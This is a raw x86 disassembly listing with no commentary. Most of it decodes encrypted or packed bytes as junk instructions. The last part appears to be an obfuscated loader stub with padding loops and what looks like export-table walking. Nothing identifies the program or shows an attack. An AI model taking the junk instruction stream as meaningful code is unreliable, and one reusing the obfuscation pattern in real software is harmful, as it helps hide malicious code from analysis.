  40eb53:	test   BYTE PTR [esp+esi*4+0x19],bl
  40eb57:	xchg   esp,eax
  40eb58:	sar    BYTE PTR [edx-0x5b],1
  40eb5b:	xchg   ebx,eax
  40eb5c:	xor    BYTE PTR [esi],0xaa
  40eb5f:	mov    dl,0xff
  40eb61:	xchg   edx,eax
  40eb62:	dec    ecx
  40eb63:	xchg   eax,eax
  40eb65:	dec    edi
  40eb66:	lods   eax,DWORD PTR ds:[esi]
  40eb67:	and    bl,BYTE PTR [edx+0x77]
  40eb6a:	inc    esp
  40eb6b:	sahf   
  40eb6c:	into   
  40eb6d:	mov    esi,0x554865d0
  40eb72:	cld    
  40eb73:	inc    edi
  40eb74:	clc    
  40eb75:	inc    edx
  40eb76:	mov    es,WORD PTR ds:0xa1eba066
  40eb7c:	retf   0x79d
  40eb7f:	mov    bh,BYTE PTR [edi-0x23b1bc72]
  40eb85:	xlat   BYTE PTR ds:[ebx]
  40eb86:	mov    eax,ds:0x78dc5fee
  40eb8b:	xor    BYTE PTR [eax-0x36],dl
  40eb8e:	jmp    0x7ade2656
  40eb93:	clc    
  40eb94:	sbb    BYTE PTR [ebp+0x3973e303],bl
  40eb9a:	sahf   
  40eb9b:	fsubr  QWORD PTR [eax+0x74fd55b6]
  40eba1:	enter  0x5346,0xaf
  40eba5:	jmp    0xe4b0:0x720f67be
  40ebac:	outs   dx,BYTE PTR ds:[esi]
  40ebad:	bound  ecx,QWORD PTR [esp+esi*8-0x42644145]
  40ebb4:	push   ebp
  40ebb5:	pop    esp
  40ebb6:	jae    0x40ebb0
  40ebb8:	jl     0x40ec36
  40ebba:	lds    edi,FWORD PTR [ebx]
  40ebbc:	ret    
  40ebbd:	icebp  
  40ebbe:	pop    ss
  40ebbf:	mov    eax,0x9b08b5fe
  40ebc4:	sbb    ecx,DWORD PTR [edx]
  40ebc6:	jg     0x40eb78
  40ebc8:	repz fstp TBYTE PTR [edi-0x229cbf9b]
  40ebcf:	jge    0x40eb79
  40ebd1:	jmp    0xfeea9792
  40ebd6:	pusha  
  40ebd7:	xchg   ecx,eax
  40ebd8:	push   ds
  40ebd9:	xor    eax,0xe7b859d6
  40ebde:	xor    eax,0xcbeaecbd
  40ebe3:	push   eax
  40ebe4:	adc    DWORD PTR [edx],ebx
  40ebe6:	aaa    
  40ebe7:	xchg   esi,eax
  40ebe8:	xchg   ah,bl
  40ebea:	outs   dx,DWORD PTR ds:[esi]
  40ebeb:	sub    BYTE PTR [ebp-0x5b63559a],al
  40ebf1:	pop    edx
  40ebf2:	aam    0x71
  40ebf4:	fadd   DWORD PTR [ebx+0x4b]
  40ebf7:	adc    esi,esp
  40ebf9:	clc    
  40ebfa:	mov    ebx,0x79f854f0
  40ebff:	jnp    0x40ebfc
  40ec01:	fidivr DWORD PTR [eax-0x50]
  40ec04:	mov    dh,0x17
  40ec06:	into   
  40ec07:	pop    ss
  40ec08:	ret    0xb01b
  40ec0b:	add    al,0xb7
  40ec0d:	mov    dl,0xac
  40ec0f:	sbb    DWORD PTR [ebp+0x16037c4c],ebx
  40ec15:	loop   0x40ec8a
  40ec17:	and    ebx,ebp
  40ec19:	inc    edi
  40ec1a:	in     al,dx
  40ec1b:	fdivr  DWORD PTR [edx+0x68]
  40ec1e:	in     al,dx
  40ec1f:	pop    esi
  40ec20:	pop    edi
  40ec21:	push   ss
  40ec22:	xor    BYTE PTR [eax],ah
  40ec24:	jecxz  0x40ec0c
  40ec26:	pminub mm6,QWORD PTR [esp+eax*2+0x6e0eab8a]
  40ec2e:	sbb    eax,0x8156d1ce
  40ec33:	test   esp,edx
  40ec35:	fdiv   DWORD PTR ds:0xada36e04
  40ec3b:	fld    TBYTE PTR [edx]
  40ec3d:	mov    esp,0x5fac126d
  40ec42:	push   ecx
  40ec43:	(bad)  
  40ec44:	adc    ecx,esi
  40ec46:	fadd   st,st(7)
  40ec48:	dec    esi
  40ec49:	fucom  st(4)
  40ec4b:	sub    DWORD PTR [eax],ebx
  40ec4d:	adc    BYTE PTR [ecx+edx*4-0x7d],dh
  40ec51:	out    dx,al
  40ec52:	jecxz  0x40ebeb
  40ec54:	or     ebp,edi
  40ec56:	lds    esp,FWORD PTR [eax]
  40ec58:	ficom  WORD PTR [eax]
  40ec5a:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40ec5c:	shr    ebx,1
  40ec5e:	adc    DWORD PTR [edx+0x41ef04f6],ebp
  40ec64:	scas   al,BYTE PTR es:[edi]
  40ec65:	out    dx,al
  40ec66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec67:	fisubr WORD PTR [esi]
  40ec69:	popf   
  40ec6a:	fild   WORD PTR [eax+0x65]
  40ec6d:	cs jmp 0x803d:0x694641a2
  40ec75:	cmc    
  40ec76:	ja     0x40ecd6
  40ec78:	aam    0x5a
  40ec7a:	pop    esi
  40ec7b:	cmp    al,0xb2
  40ec7d:	xchg   ecx,eax
  40ec7e:	sub    DWORD PTR [eax+0x4c],ecx
  40ec81:	hlt    
  40ec82:	(bad)  
  40ec83:	aas    
  40ec84:	(bad)  
  40ec85:	cmp    al,0x4e
  40ec87:	cmp    DWORD PTR [ecx+0x3d127486],esi
  40ec8d:	cmp    edx,DWORD PTR [ecx+0x10]
  40ec90:	or     ch,al
  40ec92:	sub    esi,ecx
  40ec94:	in     al,dx
  40ec95:	sbb    BYTE PTR [edx+0x60f82b11],ah
  40ec9b:	icebp  
  40ec9c:	jb     0x40ec4a
  40ec9e:	xchg   esi,eax
  40ec9f:	cwde   
  40eca0:	xor    ebp,DWORD PTR [ebp+0x22]
  40eca3:	pop    ebp
  40eca4:	xchg   edx,eax
  40eca5:	js     0x40eca8
  40eca7:	pop    ebp
  40eca8:	mov    ds:0x15e88427,eax
  40ecad:	idiv   DWORD PTR [eax-0x6313faee]
  40ecb3:	ins    BYTE PTR es:[edi],dx
  40ecb4:	or     DWORD PTR [edi-0x46fc7adb],esp
  40ecba:	cmp    eax,esi
  40ecbc:	mov    dh,dh
  40ecbe:	scas   eax,DWORD PTR es:[edi]
  40ecbf:	test   al,0xd0
  40ecc1:	pop    esi
  40ecc2:	loopne 0x40ece9
  40ecc4:	stos   BYTE PTR es:[edi],al
  40ecc5:	xchg   ebx,eax
  40ecc6:	repnz mov ebp,0xc26964e3
  40eccc:	inc    eax
  40eccd:	loopne 0x40ec76
  40eccf:	mov    ch,0x5c
  40ecd1:	mov    ebx,0xf34eec26
  40ecd6:	leave  
  40ecd7:	(bad)  
  40ecd8:	jle    0x40ed01
  40ecda:	xchg   BYTE PTR [edi-0xd],al
  40ecdd:	je     0x40ec8c
  40ecdf:	push   0x4e
  40ece1:	push   cs
  40ece2:	cmc    
  40ece3:	movzx  ebx,ax
  40ece6:	mov    ds:0xff6d4006,al
  40eceb:	mov    bl,0x99
  40eced:	cld    
  40ecee:	push   ds
  40ecef:	aad    0x14
  40ecf1:	inc    ebx
  40ecf2:	cmc    
  40ecf3:	sti    
  40ecf4:	push   ebp
  40ecf5:	in     eax,dx
  40ecf6:	je     0x40ec7f
  40ecf8:	and    esp,DWORD PTR ds:0xa4aba42b
  40ecfe:	mov    ah,0xa5
  40ed00:	retf   0xaeae
  40ed03:	data16 and al,0xb5
  40ed06:	mov    al,ds:0xd870da82
  40ed0b:	out    dx,eax
  40ed0c:	outs   dx,BYTE PTR ds:[esi]
  40ed0d:	ds dec eax
  40ed0f:	dec    edx
  40ed10:	and    dl,BYTE PTR [esi+0x4e]
  40ed13:	adc    eax,0xb9f070a3
  40ed18:	shl    BYTE PTR [edx+0x7c],1
  40ed1b:	ja     0x40ed63
  40ed1d:	jae    0x40ed80
  40ed1f:	cld    
  40ed20:	lods   al,BYTE PTR ds:[esi]
  40ed21:	rcr    BYTE PTR [edx+0x77b3d9d3],cl
  40ed27:	pusha  
  40ed28:	imul   BYTE PTR [edi+0x78ede1c9]
  40ed2e:	push   edi
  40ed2f:	mov    esp,0x54b9336d
  40ed34:	push   ebp
  40ed35:	xchg   esi,eax
  40ed36:	mov    al,BYTE PTR [ecx+0x1d]
  40ed39:	inc    ebx
  40ed3a:	push   ds
  40ed3b:	inc    esp
  40ed3c:	fsub   DWORD PTR [ebx-0x654b3f0c]
  40ed42:	cld    
  40ed43:	std    
  40ed44:	(bad)  
  40ed46:	lods   eax,DWORD PTR ds:[esi]
  40ed47:	sub    ah,BYTE PTR [ebp-0x30fbcf30]
  40ed4d:	lahf   
  40ed4e:	push   ebp
  40ed4f:	pop    ebx
  40ed50:	push   ebx
  40ed51:	mov    ds:0xd7b6f50a,al
  40ed56:	clc    
  40ed57:	inc    esi
  40ed58:	mov    fs:0xca9bafaa,al
  40ed5e:	stc    
  40ed5f:	lods   eax,DWORD PTR ds:[esi]
  40ed60:	dec    edx
  40ed61:	aad    0xd7
  40ed63:	std    
  40ed64:	cmp    edi,ebx
  40ed66:	push   es
  40ed67:	daa    
  40ed68:	add    eax,0xcb61e736
  40ed6d:	mov    fs,WORD PTR [esi-0x4621d6df]
  40ed73:	ins    DWORD PTR es:[edi],dx
  40ed74:	cmp    eax,0x34a950e4
  40ed79:	cli    
  40ed7a:	xchg   edx,eax
  40ed7b:	hlt    
  40ed7c:	push   cs
  40ed7d:	stc    
  40ed7e:	daa    
  40ed7f:	lods   al,BYTE PTR ds:[esi]
  40ed80:	and    al,0x46
  40ed82:	or     ah,BYTE PTR [edi-0x14]
  40ed85:	and    BYTE PTR [edx-0xdccbac9],0x76
  40ed8c:	sbb    ch,ah
  40ed8e:	js     0x40edaf
  40ed90:	cs (bad) 
  40ed92:	lahf   
  40ed93:	jecxz  0x40ed50
  40ed95:	cmp    BYTE PTR [eax+0x7c619310],0x3c
  40ed9c:	mov    al,0x86
  40ed9e:	inc    esi
  40ed9f:	shr    al,1
  40eda1:	dec    esp
  40eda2:	call   0x25b4:0x7a06e5cc
  40eda9:	add    BYTE PTR [edi],ah
  40edab:	xchg   edx,eax
  40edac:	rcl    edx,1
  40edae:	and    BYTE PTR [edx+0x55],bh
  40edb1:	pusha  
  40edb2:	imul   ebp,DWORD PTR [edx],0xc762a200
  40edb8:	ror    BYTE PTR [eax],0x62
  40edbb:	pop    ss
  40edbc:	push   edx
  40edbd:	add    ebx,ebx
  40edbf:	mov    ebp,0x9b234449
  40edc4:	or     ah,BYTE PTR [esi+eiz*4+0x5f5fbb18]
  40edcb:	(bad)  
  40edcc:	jnp    0x40ee35
  40edce:	in     al,dx
  40edcf:	mov    bh,BYTE PTR [ebx]
  40edd1:	fwait
  40edd2:	and    eax,0x37c357f2
  40edd7:	dec    eax
  40edd8:	sahf   
  40edd9:	cmp    al,0x43
  40eddb:	inc    edi
  40eddc:	loopne 0x40edeb
  40edde:	xchg   esp,eax
  40eddf:	mov    cl,0x5f
  40ede1:	test   eax,0x3ace9e72
  40ede6:	mov    esi,0x6b4c773f
  40edeb:	or     al,0x19
  40eded:	outs   dx,DWORD PTR ds:[esi]
  40edee:	les    eax,FWORD PTR [ecx]
  40edf0:	cmc    
  40edf1:	test   DWORD PTR [ebx+esi*2+0x7fd1b23],0x301c1869
  40edfc:	daa    
  40edfd:	cmp    esi,ecx
  40edff:	imul   ebx,DWORD PTR [ecx-0xe],0xbb59af6
  40ee06:	mov    ds:0x2a6e933a,al
  40ee0b:	cmp    al,0x86
  40ee0d:	stc    
  40ee0e:	push   ds
  40ee0f:	pop    ds
  40ee10:	mov    dl,0x7a
  40ee12:	fmul   QWORD PTR [edi-0x5e]
  40ee15:	or     al,0x49
  40ee17:	add    BYTE PTR [eax-0x40f770a3],dh
  40ee1d:	mov    esp,0xba086b1b
  40ee22:	or     DWORD PTR [eax-0x521d0561],esi
  40ee28:	std    
  40ee29:	aas    
  40ee2a:	sub    al,0x1b
  40ee2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee2d:	jae    0x40ee09
  40ee2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee30:	rol    ah,cl
  40ee32:	adc    esp,eax
  40ee34:	add    DWORD PTR [eax],edi
  40ee36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee37:	(bad)  
  40ee38:	dec    ecx
  40ee39:	lds    eax,FWORD PTR [esi-0xf]
  40ee3c:	std    
  40ee3d:	clc    
  40ee3e:	xchg   esp,eax
  40ee3f:	shl    dl,0x4b
  40ee42:	neg    ch
  40ee44:	push   0xbc98791f
  40ee49:	dec    ecx
  40ee4a:	sbb    ah,BYTE PTR [eax]
  40ee4c:	es xchg ecx,eax
  40ee4e:	add    BYTE PTR [edi],al
  40ee50:	fisub  DWORD PTR [ebx+0x2]
  40ee53:	cmp    BYTE PTR [ebx-0x23],bh
  40ee56:	xchg   esp,eax
  40ee57:	push   es
  40ee58:	fnstenv [ebx]
  40ee5a:	cmp    ebp,0x6419b212
  40ee60:	mov    edx,ss
  40ee62:	jbe    0x40edf4
  40ee64:	cmp    eax,0xcd7a9ef5
  40ee69:	pop    ecx
  40ee6a:	cs push ss
  40ee6c:	fdivr  DWORD PTR [edx+0x54]
  40ee70:	inc    edi
  40ee71:	ds pop esi
  40ee73:	fistp  WORD PTR [edx-0x6157601e]
  40ee79:	ror    BYTE PTR [esi],1
  40ee7b:	inc    edx
  40ee7c:	push   0x37
  40ee7e:	xchg   DWORD PTR cs:[edx],esi
  40ee81:	mov    edi,DWORD PTR [eax-0xb]
  40ee84:	adc    DWORD PTR [ebp-0x66],ecx
  40ee87:	mov    ds:0x3b9f5475,al
  40ee8c:	scas   eax,DWORD PTR es:[edi]
  40ee8d:	sub    al,BYTE PTR [esi+esi*4+0x925ec19]
  40ee94:	add    al,0x6
  40ee96:	jno    0x40ee50
  40ee98:	out    dx,eax
  40ee99:	psubsb mm5,mm6
  40ee9c:	mov    esi,0xa77ee72a
  40eea1:	rcl    dh,1
  40eea3:	mov    ch,0xdb
  40eea5:	fimul  DWORD PTR [edx-0x1]
  40eea8:	sub    BYTE PTR cs:[edi-0x4a],dh
  40eeac:	lds    eax,FWORD PTR [eax+0x2c62c89d]
  40eeb2:	jg     0x40ee90
  40eeb4:	mov    ds:0x9f8363cb,eax
  40eeb9:	cwde   
  40eeba:	out    0xf8,eax
  40eebc:	sbb    edx,DWORD PTR [esi+0x186f6b05]
  40eec2:	push   ecx
  40eec3:	jge    0x40ee5f
  40eec5:	inc    edi
  40eec6:	gs mov dh,0xa1
  40eec9:	clc    
  40eeca:	in     eax,0xdc
  40eecc:	pop    eax
  40eecd:	ja     0x40ee96
  40eecf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eed0:	sbb    esi,DWORD PTR [esi-0x503737da]
  40eed6:	cli    
  40eed7:	js     0x40eef2
  40eed9:	les    eax,FWORD PTR [ecx]
  40eedb:	sbb    dl,cl
  40eedd:	cmp    eax,0xe076842b
  40eee2:	loope  0x40ee99
  40eee4:	mov    edx,cs
  40eee6:	or     esi,esp
  40eee8:	mov    eax,0x6aae790b
  40eeed:	imul   DWORD PTR [edx+0x4a1cbd95]
  40eef3:	(bad)  [ecx-0x41]
  40eef6:	dec    esi
  40eef7:	jnp    0x40ee9f
  40eef9:	adc    al,0x3b
  40eefb:	mov    dl,0xc2
  40eefd:	and    dh,ah
  40eeff:	mov    cl,0x39
  40ef01:	pop    eax
  40ef02:	ins    DWORD PTR es:[edi],dx
  40ef03:	outs   dx,DWORD PTR ds:[esi]
  40ef04:	(bad)  
  40ef05:	test   eax,0xa638ac2
  40ef0a:	aam    0x88
  40ef0c:	bound  esp,QWORD PTR [ebp+0x7e]
  40ef0f:	lock and al,0x0
  40ef12:	inc    ebx
  40ef13:	mov    WORD PTR [ebp+0x2],es
  40ef16:	fucom  st(5)
  40ef18:	inc    edx
  40ef19:	mov    al,0x6
  40ef1b:	jb     0x40eef3
  40ef1d:	test   BYTE PTR [edx-0x4dc99a5f],0xdc
  40ef24:	lahf   
  40ef25:	(bad)  
  40ef26:	es push edi
  40ef28:	jmp    0xa096ad73
  40ef2d:	mov    esi,DWORD PTR [edi+ecx*2+0x7b12652a]
  40ef34:	jle    0x40ef19
  40ef36:	sub    DWORD PTR [ebx+ecx*8+0x2d4b8798],edi
  40ef3d:	add    eax,0x190b0a30
  40ef42:	mov    esp,0xfc050063
  40ef47:	outs   dx,DWORD PTR ds:[esi]
  40ef48:	or     BYTE PTR ds:0xb8df81fb,bl
  40ef4e:	xchg   edi,eax
  40ef4f:	inc    ecx
  40ef50:	and    BYTE PTR [edx],dl
  40ef52:	mov    ?,WORD PTR [eax+0x4e]
  40ef55:	scas   al,BYTE PTR es:[edi]
  40ef56:	icebp  
  40ef57:	add    BYTE PTR [edi+0x2e],ch
  40ef5a:	push   esi
  40ef5b:	dec    eax
  40ef5c:	push   0x90405ce4
  40ef61:	mov    ?,WORD PTR [edx]
  40ef63:	loop   0x40ef2d
  40ef65:	mov    edi,0x76edeb3f
  40ef6a:	in     al,dx
  40ef6b:	push   edx
  40ef6c:	(bad)  
  40ef6d:	cmp    eax,0x76d5645
  40ef72:	pop    ebx
  40ef73:	dec    ecx
  40ef74:	cmp    DWORD PTR [edi-0x43],eax
  40ef77:	aaa    
  40ef78:	mov    BYTE PTR [edi+0x30],al
  40ef7b:	push   esi
  40ef7c:	push   esp
  40ef7d:	and    dh,dl
  40ef7f:	and    al,0x64
  40ef81:	arpl   WORD PTR [eax],bx
  40ef83:	aas    
  40ef84:	xchg   DWORD PTR [ecx+0x5fea6dce],edx
  40ef8a:	push   ds
  40ef8b:	mov    esp,0xa77b8b8e
  40ef90:	mov    al,0x86
  40ef92:	inc    edi
  40ef93:	add    al,0xf9
  40ef95:	adc    DWORD PTR [ebx+0x67ba98b1],ebp
  40ef9b:	adc    DWORD PTR [edx],eax
  40ef9d:	lahf   
  40ef9e:	fs data16 fwait
  40efa1:	xchg   edx,eax
  40efa2:	mov    dh,0x8e
  40efa4:	xchg   ebp,eax
  40efa5:	jne    0x40efbe
  40efa7:	xchg   ebp,eax
  40efa8:	jns    0x40ef36
  40efaa:	xor    ch,cl
  40efac:	mov    ds:0xae9e7930,al
  40efb1:	mov    bh,0x48
  40efb3:	ficom  WORD PTR [esp+ecx*2-0x19]
  40efb7:	jb     0x40efa7
  40efb9:	jl     0x40efcc
  40efbb:	mov    ah,BYTE PTR [esi+0x62]
  40efbe:	mov    dl,BYTE PTR [edx+0x77]
  40efc1:	div    BYTE PTR [ebx-0x34]
  40efc4:	and    esi,DWORD PTR [esi-0x67]
  40efc7:	addr16 jmp 0x62bbc615
  40efcd:	inc    eax
  40efce:	cmp    edi,esi
  40efd0:	sub    DWORD PTR [edx+0x2e],ecx
  40efd3:	daa    
  40efd4:	mov    eax,ds:0x6c1cba9b
  40efd9:	fst    QWORD PTR [edi]
  40efdb:	mov    bh,0x25
  40efdd:	xchg   esp,eax
  40efde:	pop    esi
  40efdf:	sbb    bl,al
  40efe1:	jo     0x40f04f
  40efe3:	or     al,0x39
  40efe5:	add    BYTE PTR ds:0x910556cb,dl
  40efeb:	stc    
  40efec:	pop    edx
  40efed:	xlat   BYTE PTR ds:[ebx]
  40efee:	pop    ds
  40efef:	pop    ecx
  40eff0:	sub    BYTE PTR [edi],bl
  40eff2:	jo     0x40efb7
  40eff4:	or     al,0x2b
  40eff6:	push   ds
  40eff7:	scas   al,BYTE PTR es:[edi]
  40eff8:	xor    bh,bl
  40effa:	std    
  40effb:	ficom  DWORD PTR [esi-0x10ba0c00]
  40f001:	pop    es
  40f002:	pop    esi
  40f003:	sub    bl,BYTE PTR [edx+0x43]
  40f006:	(bad)  
  40f008:	add    esp,ebp
  40f00a:	mov    dh,0xe7
  40f00c:	inc    esi
  40f00d:	arpl   ax,ax
  40f00f:	xor    DWORD PTR [esi],ebx
  40f011:	adc    DWORD PTR [edi],eax
  40f013:	data16 sbb al,0x5c
  40f016:	retf   0x519d
  40f019:	inc    esp
  40f01a:	jae    0x40f09b
  40f01c:	mov    ah,cl
  40f01e:	pusha  
  40f01f:	(bad)  
  40f020:	mov    al,0x21
  40f022:	add    BYTE PTR [ebp-0x1c],0x28
  40f026:	and    BYTE PTR [edi+0x6edb3fef],dl
  40f02c:	out    dx,al
  40f02d:	and    eax,DWORD PTR [esi+0x7d]
  40f030:	add    eax,0xb71c7cd8
  40f035:	loope  0x40f05d
  40f037:	dec    edx
  40f038:	mov    al,ds:0xfa008e4c
  40f03d:	xor    eax,0x4e305b99
  40f042:	enter  0x2d1c,0xeb
  40f046:	(bad)  
  40f047:	(bad)  
  40f048:	mov    DWORD PTR ds:0xde712fc,eax
  40f04e:	sbb    BYTE PTR [ecx],dh
  40f050:	xor    eax,0xb68f7bb5
  40f055:	clc    
  40f056:	push   ebp
  40f057:	dec    eax
  40f059:	cmp    al,0xc6
  40f05b:	rcr    BYTE PTR [edi+edi*2-0x7c741d64],0x44
  40f063:	fistp  DWORD PTR [esi-0x72b18d9f]
  40f069:	xchg   ebp,eax
  40f06a:	les    eax,FWORD PTR [esi-0x7b2d61b1]
  40f070:	mov    al,ds:0xdd442719
  40f075:	mov    ds,WORD PTR [esi]
  40f077:	mov    al,0x75
  40f079:	dec    ebx
  40f07a:	cmp    al,0xfd
  40f07c:	mov    eax,0x1469fd57
  40f081:	and    DWORD PTR [eax+0x65f85be2],esp
  40f087:	ret    
  40f088:	dec    esp
  40f089:	test   eax,0xea71cba0
  40f08e:	imul   BYTE PTR [edx]
  40f090:	sub    edi,DWORD PTR ds:0x24467515
  40f096:	adc    eax,0xdf2f2848
  40f09b:	int3   
  40f09c:	sub    DWORD PTR [edx+0x3a],0x90f19e4e
  40f0a3:	js     0x40f0b1
  40f0a5:	sti    
  40f0a6:	bound  esi,QWORD PTR [edx+0x7655d6fb]
  40f0ac:	pop    ss
  40f0ad:	mov    cl,0x9d
  40f0af:	dec    BYTE PTR [ebp-0x64]
  40f0b2:	rol    BYTE PTR [eax-0x6f],1
  40f0b5:	ret    
  40f0b6:	or     al,0x3b
  40f0b8:	in     eax,0x23
  40f0ba:	xchg   esp,eax
  40f0bb:	cmp    DWORD PTR [edi],ebx
  40f0bd:	mov    edi,ebp
  40f0bf:	add    ebp,DWORD PTR [edi]
  40f0c1:	adc    DWORD PTR [ecx],ebx
  40f0c3:	xchg   DWORD PTR ds:0xd665891a,ebp
  40f0c9:	pop    es
  40f0ca:	sbb    eax,0x45730d8f
  40f0cf:	fs pop esp
  40f0d1:	lock inc esi
  40f0d3:	inc    esi
  40f0d4:	mov    WORD PTR [ebx],cs
  40f0d6:	dec    esp
  40f0d7:	sahf   
  40f0d8:	dec    edi
  40f0d9:	jmp    0x5652:0x8289d6fd
  40f0e0:	aad    0xfa
  40f0e2:	inc    bl
  40f0e4:	ja     0x40f165
  40f0e6:	adc    edx,ebp
  40f0e8:	das    
  40f0e9:	xor    DWORD PTR [eax],ecx
  40f0eb:	fcmovnbe st,st(7)
  40f0ed:	adc    al,0x89
  40f0ef:	mov    eax,ds:0x5824db14
  40f0f4:	jno    0x40f0e0
  40f0f6:	jge    0x40f0a1
  40f0f8:	inc    ebp
  40f0f9:	retf   0xc69d
  40f0fc:	add    DWORD PTR [ecx+0x6b5ed7f4],ecx
  40f102:	mov    dl,0xc5
  40f104:	mov    al,0x77
  40f106:	adc    ah,dl
  40f108:	gs mov ebx,0x91451b1
  40f10e:	add    al,0xd7
  40f110:	push   edi
  40f111:	aad    0x86
  40f113:	hlt    
  40f114:	scas   al,BYTE PTR es:[edi]
  40f115:	jno    0x40f189
  40f117:	pop    esp
  40f118:	xchg   esp,eax
  40f119:	neg    ebx
  40f11b:	add    ch,BYTE PTR [ecx]
  40f11d:	ds cmp ebp,ecx
  40f120:	push   0x4208d5bc
  40f125:	cld    
  40f126:	xor    ebx,esi
  40f128:	add    DWORD PTR ds:0x42a010,0x42d018
  40f132:	add    ebx,edi
  40f134:	and    DWORD PTR ds:0x42c008,0x0
  40f13e:	mov    eax,ds:0x42c008
  40f143:	inc    eax
  40f144:	mov    ds:0x42c008,eax
  40f149:	cmp    DWORD PTR ds:0x42c008,0xe
  40f150:	ja     0x40f191
  40f156:	jmp    0x40f16c
  40f15b:	push   DWORD PTR [ebp-0x28]
  40f15e:	push   0x7f19
  40f163:	push   DWORD PTR [ebp-0x28]
  40f166:	call   DWORD PTR ds:0x43004b
  40f16c:	cmp    DWORD PTR ds:0x42c008,0xd
  40f173:	jne    0x40f184
  40f179:	mov    eax,ds:0x42c008
  40f17e:	inc    eax
  40f17f:	mov    ds:0x42c008,eax
  40f184:	cmp    DWORD PTR ds:0x42c008,0x1b
  40f18b:	jb     0x40f13e
  40f191:	mov    eax,DWORD PTR [ebp-0x24]
  40f194:	sub    eax,edi
  40f196:	lea    ecx,[ebx-0x3272ec]
  40f19c:	mov    DWORD PTR ds:0x42d000,0x77e
  40f1a6:	xor    eax,esi
  40f1a8:	or     DWORD PTR ds:0x42b004,0x429020
  40f1b2:	xor    ecx,esi
  40f1b4:	mov    DWORD PTR ds:0x42c008,0x6bd4
  40f1be:	cmp    ecx,eax
  40f1c0:	mov    DWORD PTR ds:0x42901c,0x68e9
  40f1ca:	je     0x411851
  40f1d0:	and    DWORD PTR ds:0x42a01c,0x0
  40f1da:	xor    eax,eax
  40f1dc:	add    eax,DWORD PTR ds:0x42a01c
  40f1e2:	inc    eax
  40f1e3:	mov    ds:0x42a01c,eax
  40f1e8:	cmp    DWORD PTR ds:0x42a01c,0x13
  40f1ef:	jg     0x40f217
  40f1f5:	jmp    0x40f20a
  40f1fa:	push   0x42c004
  40f1ff:	push   0x42f169
  40f204:	call   DWORD PTR ds:0x43000b
  40f20a:	cmp    DWORD PTR ds:0x42a01c,0x12
  40f211:	jb     0x40f1da
  40f217:	mov    eax,DWORD PTR [ebp-0x4]
  40f21a:	xor    eax,esi
  40f21c:	sub    DWORD PTR ds:0x42d00c,0x11b5
  40f226:	add    eax,edi
  40f228:	cmp    ebx,eax
  40f22a:	jne    0x40f40e
  40f230:	push   DWORD PTR [ebp+0x8]
  40f233:	call   0x424833
  40f238:	mov    DWORD PTR [ebp-0x14],eax
  40f23b:	or     DWORD PTR ds:0x42c018,0xd46
  40f245:	mov    eax,DWORD PTR [ebp-0x4]
  40f248:	or     DWORD PTR ds:0x42d00c,ebx
  40f24e:	mov    ecx,DWORD PTR [ebp-0x14]
  40f251:	adc    DWORD PTR ds:0x429008,0x4a78
  40f25b:	xor    eax,esi
  40f25d:	xor    DWORD PTR ds:0x42b018,0x54c5
  40f267:	add    eax,edi
  40f269:	mov    DWORD PTR ds:0x42c00c,0x1824
  40f273:	cmp    ecx,eax
  40f275:	je     0x4118bc
  40f27b:	push   DWORD PTR [ebp-0x14]
  40f27e:	or     DWORD PTR ds:0x42b008,0x429004
  40f288:	push   DWORD PTR [ebp+0x8]
  40f28b:	and    DWORD PTR ds:0x42c008,0x42a014
  40f295:	call   0x424905
  40f29a:	dec    ecx
  40f29b:	mov    DWORD PTR [ebp-0x14],eax
  40f29e:	xor    DWORD PTR ds:0x42c004,ecx
  40f2a4:	mov    eax,DWORD PTR [ebp-0x4]
  40f2a7:	adc    DWORD PTR ds:0x42a008,edx
  40f2ad:	mov    ecx,DWORD PTR [ebp-0x14]
  40f2b0:	sub    DWORD PTR ds:0x42a010,0x429020
  40f2ba:	xor    eax,esi
  40f2bc:	adc    DWORD PTR ds:0x42a010,0x42901c
  40f2c6:	add    eax,edi
  40f2c8:	mov    DWORD PTR ds:0x42b008,0x358c
  40f2d2:	cmp    ecx,eax
  40f2d4:	mov    DWORD PTR ds:0x42a018,0x235e
  40f2de:	je     0x4118bc
  40f2e4:	xor    eax,ecx
  40f2e6:	mov    eax,DWORD PTR [ebp-0x14]
  40f2e9:	mov    eax,DWORD PTR [eax+0x18]
  40f2ec:	mov    DWORD PTR [ebp-0x24],eax
  40f2ef:	sub    DWORD PTR ds:0x42b000,0x5870
  40f2f9:	mov    eax,DWORD PTR [ebp-0x14]
  40f2fc:	movzx  ecx,WORD PTR ds:0x42a010
  40f303:	sbb    DWORD PTR ds:0x42c004,ecx
  40f309:	mov    ecx,DWORD PTR [ebp+0x8]
  40f30c:	add    ecx,DWORD PTR [eax+0x20]
  40f30f:	and    DWORD PTR ds:0x42b010,0x0
  40f319:	jmp    0x40f329
  40f31e:	mov    eax,ds:0x42b010
  40f323:	inc    eax
  40f324:	mov    ds:0x42b010,eax
  40f329:	cmp    DWORD PTR ds:0x42b010,0x15
  40f330:	jae    0x40f35d
  40f336:	cmp    DWORD PTR ds:0x42b010,0x1a
  40f33d:	jb     0x40f35d
  40f343:	jmp    0x40f358
  40f348:	push   0x42b01c
  40f34d:	push   0x6b11
  40f352:	call   DWORD PTR ds:0x43000f
  40f358:	jmp    0x40f31e
  40f35d:	mov    DWORD PTR [ebp-0x2c],ecx
  40f360:	xor    DWORD PTR ds:0x42a014,edi
  40f366:	mov    eax,DWORD PTR [ebp-0x14]
  40f369:	mov    DWORD PTR ds:0x42c014,0x19
  40f373:	cmp    DWORD PTR ds:0x42c014,0x0
  40f37a:	je     0x40f3c4
  40f380:	cmp    DWORD PTR ds:0x42c014,0x5
  40f387:	jbe    0x40f3c4
  40f38d:	jmp    0x40f398
  40f392:	call   DWORD PTR ds:0x430013
  40f398:	cmp    DWORD PTR ds:0x42c014,0x6
  40f39f:	jne    0x40f3b2
  40f3a5:	mov    ecx,DWORD PTR ds:0x42c014
  40f3ab:	dec    ecx
  40f3ac:	mov    DWORD PTR ds:0x42c014,ecx
  40f3b2:	mov    ecx,DWORD PTR ds:0x42c014
  40f3b8:	dec    ecx
  40f3b9:	mov    DWORD PTR ds:0x42c014,ecx
  40f3bf:	jmp    0x40f373
  40f3c4:	mov    ecx,DWORD PTR [ebp+0x8]
